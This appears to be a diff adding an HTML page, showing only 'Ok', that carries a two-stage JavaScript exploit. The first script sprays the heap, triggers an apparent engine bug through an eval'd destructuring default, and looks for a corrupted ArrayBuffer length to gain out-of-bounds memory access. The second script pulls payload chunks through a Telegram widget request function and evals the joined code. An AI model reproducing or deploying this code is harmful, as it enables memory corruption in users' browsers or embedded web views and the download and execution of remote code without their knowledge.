@@ -1,0 +1,22 @@
+<!doctype html><body><div id="v">Ok</div><script id="stageA">'use strict';var HS=[[4000, 2600], [3200, 3000]],ATT=0,mark='NOCORR',T0=Date.now();function prime(){var G=new Array(1500),i;for(i=0;i<1500;i++)G[i]='x'.repeat(2048);var G0={};G=null;G0=null}function gcNow(){var G=new Array(1500),i;for(i=0;i<1500;i++)G[i]='y'.repeat(2048);var G0={};G=null;G0=null}var RT=[4,0,0,128,5,0,0,0,4,0,0,0,4,0,0,0,4,0,0,0],RJ=[4,0,0,128,5,0,0,0,255,255,0,0,4,0,0,0,4,0,0,0],U=new Uint8Array(479),o;for(o=28;o+40<=479;o+=40)for(var k=0;k<20;k++)U[o+k]=RJ[k],U[o+20+k]=RT[k];var S='"use strict"; globalThis.f = function ([] = eval("[]")) { var q1=0,q2=0,q3=0; return 1.1+2.2+3.3+4.4+5.5+6.6+7.7+8.8+9.9; };';prime();var V=null,VAB=null,T=null,SP=null;for(ATT=0;ATT<HS.length&&mark==='NOCORR';ATT++){if(ATT>0){gcNow()}var NP=HS[ATT][0],NQ=HS[ATT][1],A=new Array(NP+NQ),i;for(i=0;i<NP;i++)A[i]=String.fromCharCode.apply(null,U);var X=String.fromCharCode.apply(null,U);X=null;(0,eval)(S);for(i=NP;i<NP+NQ;i++)A[i]=String.fromCharCode.apply(null,U);var D=new Array(600);for(i=0;i<600;i++)D[i]=new ArrayBuffer(64);T=new Array(600);for(i=0;i<600;i++)T[i]=new ArrayBuffer(64);T[598]=null;try{f()}catch(e){}for(i=0;i<600;i++)if(T[i]!==null&&T[i].byteLength>1024){mark='ABLEN['+i+']='+T[i].byteLength+' ATT='+ATT;break}if(mark==='NOCORR'){A=null;SP=null}else{SP=A}}if(VAB===null)for(var i=0;i<600;i++)if(T[i]!==null&&T[i].byteLength>1024){VAB=T[i];break}if(VAB)try{V=new Uint8Array(VAB);mark+=' VLEN='+V.length}catch(e){mark+=' VERR='+e}globalThis.V=V;globalThis.VAB=VAB;globalThis.T=T;globalThis.SP=SP;globalThis.mark=mark+' T0='+T0;</script><script id="stageC">(function(){
+ var L=(typeof OOB_LEN=='number')?OOB_LEN:7469,
+     Y=(typeof OOB_DLY=='number')?OOB_DLY:5200,
+     N=Math.ceil(L/1000),P=[],T=0,F='W';
+ function S(){var d=document.getElementById('v');if(d)d.textContent='S1 '+(typeof mark!='undefined'?mark:'-')+' | '+F}
+ function Q(f,m){if(typeof setTimeout=='function')setTimeout(f,m);else f()}
+ function G(i){
+  if(i>=N){var s=P.join('');if(s.length!==L){F='LEN '+s.length;return S()}
+   try{(0,eval)(s)}catch(e){F='EV '+e;return S()}
+   F='HF '+(typeof MEGA!='undefined'?MEGA:'?');return S()}
+  if(typeof TelegramWidget=='undefined'||!TelegramWidget.request){F='NOAPI';return S()}
+  var p;try{p=TelegramWidget.request('E'+i)}catch(e){p=null}
+  if(!p||typeof p.then!='function'){F='PROMISE';return S()}
+  p.then(function(a){
+   var s=(typeof a=='string')?a:(a&&typeof a.result=='string')?a.result:'';
+   if(s==='X'){F='STOP';return S()}
+   if(s.length<1){if(++T>2){F='F'+i;return S()}return Q(function(){G(i)},Y)}
+   P[i]=s;T=0;F='G'+(i+1)+'/'+N;S();Q(function(){G(i+1)},(i+1<N)?Y:0)
+  },function(){if(++T>2){F='X'+i;return S()}Q(function(){G(i)},Y)})
+ }
+ G(0)
+})();</script>
